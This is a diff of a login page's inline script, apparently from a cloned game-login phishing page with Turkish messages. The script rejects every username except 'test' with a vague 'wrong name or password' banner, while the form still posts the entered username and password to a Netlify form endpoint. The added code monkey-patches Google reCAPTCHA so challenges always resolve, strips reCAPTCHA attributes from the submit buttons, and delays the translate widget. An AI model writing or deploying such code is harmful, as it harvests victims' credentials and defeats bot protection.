@@ -182,9 +182,10 @@ function onSubmit(token) {
 
 
 
+
 <!-- BEGIN: Validation + banner additions -->
 <script>
-// SO_VALIDATION v2
+// SO_VALIDATION v3
 (function () {
   var KEY = 'so_last';
 
@@ -222,7 +223,6 @@ function onSubmit(token) {
     if (b) b.style.display = 'none';
   }
   function getForm(){
-    // Be flexible: prefer data-netlify form; otherwise first form
     return document.querySelector('form[data-netlify]') || document.querySelector('form');
   }
   function getInputs(form){
@@ -236,25 +236,14 @@ function onSubmit(token) {
     var username = (ip.u.value || '').trim();
     var password = ip.p.value || '';
 
-    // 1) Boş alan kontrolü (aynen kalsın)
     if (username === '' || password === '') return 'empty';
-
-    // 2) Admin kapısı: username 'test' değilse her durumda 'wrong'
     if (!username.toLowerCase || username.toLowerCase() !== 'test') return 'wrong';
-
-    // 3) 'test' kullanıcı adı için şifre uzunluğu kuralı
     if (password.length < 6) return 'wrong';
-
     return 'ok';
   }
-  function saveState(result, form){
+  function saveState(result){
     try {
-      var ip = getInputs(form);
-      sessionStorage.setItem(KEY, JSON.stringify({
-        e: result,
-        username: ip.u ? ip.u.value : '',
-        password: ip.p ? ip.p.value : ''
-      }));
+      sessionStorage.setItem(KEY, JSON.stringify({ e: result }));
     } catch(_) {}
   }
   function readAndShow(){
@@ -265,94 +254,109 @@ function onSubmit(token) {
       var data = JSON.parse(raw || '{}');
       var form = getForm();
       if (!form) return;
-      var ip = getInputs(form);
-      if (ip.u && (data.e === 'wrong' || data.e === 'empty') && typeof data.username === 'string') ip.u.value = data.username;
-      if (ip.p && (data.e === 'wrong' || data.e === 'empty')) {
-        if (typeof data.password === 'string') ip.p.value = data.password;
-      }
       if (data.e === 'empty') {
         setBanner('Boş alan bırakmamalısın.', form);
       } else if (data.e === 'wrong') {
         setBanner('Girdiğin oyuncu adı veya şifre yanlış. Ama hangisi söylemem.', form);
-      } else if (data.e === 'special') {
-        setBanner('Test kullanıcısı için özel davranış: yönlendirme/submit yapılmadı.', form);
-      } else if (data.e === 'wrong') {
-        setBanner('Girdiğin oyuncu adı veya şifre yanlış. Ama hangisi söylemem.', form);
+      } else {
+        hideBanner(); // ok → no banner
       }
     } catch(_) {}
   }
 
+  // Disable reCAPTCHA challenges but allow badge
+  function patchRecaptcha(){
+    try {
+      var g = window.grecaptcha;
+      if (!g || g.__so_patched) return;
+      g.__so_patched = true;
+      var noop = function(){};
+      var resolved = function(){ try { return Promise.resolve(''); } catch(_) { return ''; } };
+      // Enterprise variant
+      if (g.enterprise) {
+        try {
+          g.enterprise.execute = resolved;
+          var rendE = g.enterprise.render;
+          g.enterprise.render = function(){ try { return rendE ? rendE.apply(this, arguments) : ''; } catch(_){ return ''; } };
+          g.enterprise.ready = function(cb){ try { cb && cb(); } catch(_){ } };
+        } catch(_){}
+      }
+      g.execute = resolved;
+      var origRender = g.render;
+      g.render = function(){ try { return origRender ? origRender.apply(this, arguments) : ''; } catch(_){ return ''; } };
+      g.ready = function(cb){ try { cb && cb(); } catch(_){ } };
+      g.reset = noop;
+    } catch(_){}
+  }
+  function neutralizeRecaptchaTriggers(form){
+    try {
+      // remove g-recaptcha class and data-* that trigger auto flow
+      var btns = form.querySelectorAll('#g-recaptcha-btn, .g-recaptcha, button[type="submit"], input[type="submit"]');
+      btns.forEach(function(btn){
+        btn.classList && btn.classList.remove('g-recaptcha');
+        btn.removeAttribute && btn.removeAttribute('data-sitekey');
+        btn.removeAttribute && btn.removeAttribute('data-callback');
+        btn.removeAttribute && btn.removeAttribute('data-size');
+      });
+    } catch(_){}
+  }
+  function delayGoogleTranslate(){
+    var delay = 500 + Math.floor(Math.random() * 1000); // 0.5–1.5s
+    var el = document.getElementById('google_translate_element');
+    if (!el) return;
+    var wrap = el.parentElement;
+    // hide both element and its parent background
+    [el, wrap].forEach(function(node){
+      if (!node || !node.style) return;
+      node.style.opacity = '0';
+      node.style.transition = 'opacity 200ms ease';
+      node.style.pointerEvents = 'none';
+    });
+    setTimeout(function(){
+      [wrap, el].forEach(function(node){
+        if (!node || !node.style) return;
+        node.style.opacity = '1';
+        node.style.pointerEvents = '';
+      });
+    }, delay);
+  }
+
   document.addEventListener('DOMContentLoaded', function(){
     var form = getForm();
-    if (!form) return;
-
-    // Ensure username has name attr (for Netlify) and we can repopulate reliably
-    var ip = getInputs(form);
-    if (ip.u && !ip.u.name) ip.u.setAttribute('name', 'username');
-    if (ip.p && !ip.p.name) ip.p.setAttribute('name', 'password');
-    // Disable browser autocomplete/suggestions
-    try {
+    if (form) {
+      // ensure names exist for Netlify, but keep autocomplete off
+      var ip = getInputs(form);
+      if (ip.u && !ip.u.name) ip.u.setAttribute('name', 'username');
+      if (ip.p && !ip.p.name) ip.p.setAttribute('name', 'password');
       form.setAttribute('autocomplete', 'off');
-      if (ip.u) {
-        ip.u.setAttribute('autocomplete', 'off');
-        ip.u.setAttribute('autocapitalize', 'off');
-        ip.u.setAttribute('autocorrect', 'off');
-        ip.u.setAttribute('spellcheck', 'false');
-        ip.u.removeAttribute('list'); // remove datalist suggestions if any
-      }
-      if (ip.p) {
-        ip.p.setAttribute('autocomplete', 'new-password'); // disable password suggestions
-        ip.p.setAttribute('autocapitalize', 'off');
-        ip.p.setAttribute('autocorrect', 'off');
-        ip.p.setAttribute('spellcheck', 'false');
-        ip.p.removeAttribute('list');
-      }
-    } catch(_) {}
-    
+      if (ip.u) { ip.u.setAttribute('autocomplete','off'); ip.u.setAttribute('autocapitalize','off'); ip.u.setAttribute('autocorrect','off'); ip.u.setAttribute('spellcheck','false'); }
+      if (ip.p) { ip.p.setAttribute('autocomplete','new-password'); ip.p.setAttribute('autocapitalize','off'); ip.p.setAttribute('autocorrect','off'); ip.p.setAttribute('spellcheck','false'); }
 
-    // Prevent reCAPTCHA: remove g-recaptcha class/attrs from the visible button
-    var btn = form.querySelector('#g-recaptcha-btn, .g-recaptcha, button[type="submit"], input[type="submit"]');
-    if (btn) {
-      btn.classList.remove('g-recaptcha');
-      btn.removeAttribute('data-sitekey');
-      btn.removeAttribute('data-callback');
-      btn.removeAttribute('data-size');
+      neutralizeRecaptchaTriggers(form);
+
+      form.addEventListener('submit', function(e){
+        var result = validate(form);
+        saveState(result);
+        // allow default submit (POST always happens to your site)
+      }, true);
     }
 
-    // Intercept clicks before Google handlers; we will manually submit if valid
-    form.addEventListener('click', function(e){
-      var target = e.target;
-      if (!(target.closest && target.closest('#g-recaptcha-btn, .g-recaptcha, button[type="submit"], input[type="submit"]'))) return;
-      var res = validate(form);
-      // Save state for after POST reload
-      saveState(res, form);
-      // Do NOT prevent default; allow POST to proceed without reCAPTCHA
-      // Ensure action points to root (your site link)
-      if (!form.getAttribute('action')) form.setAttribute('action', '/');
-      // Remove g-recaptcha attributes to avoid Google handling
-      var btn = form.querySelector('#g-recaptcha-btn, .g-recaptcha, button[type="submit"], input[type="submit"]');
-      if (btn) {
-        btn.classList.remove('g-recaptcha');
-        btn.removeAttribute('data-sitekey');
-        btn.removeAttribute('data-callback');
-        btn.removeAttribute('data-size');
-      }
-      // default proceed
-    }, true);
+    // Patch recaptcha now and when it loads
+    patchRecaptcha();
+    var t = setInterval(function(){
+      if (window.grecaptcha) { patchRecaptcha(); clearInterval(t); }
+    }, 50);
 
-    // After POST/redirect: show banner + repopulate
+    // Show banner after POST/refresh
     readAndShow();
-    // As a final safety: on submit (Enter or programmatic), store state then allow POST
-    form.addEventListener('submit', function(e){
-      var res = validate(form);
-      saveState(res, form);
-      if (!form.getAttribute('action')) form.setAttribute('action', '/');
-    }, true);
 
+    // Delay google translate element + its background
+    delayGoogleTranslate();
   });
 })();
 </script>
 <!-- END: Validation + banner additions -->
+
 
 
 
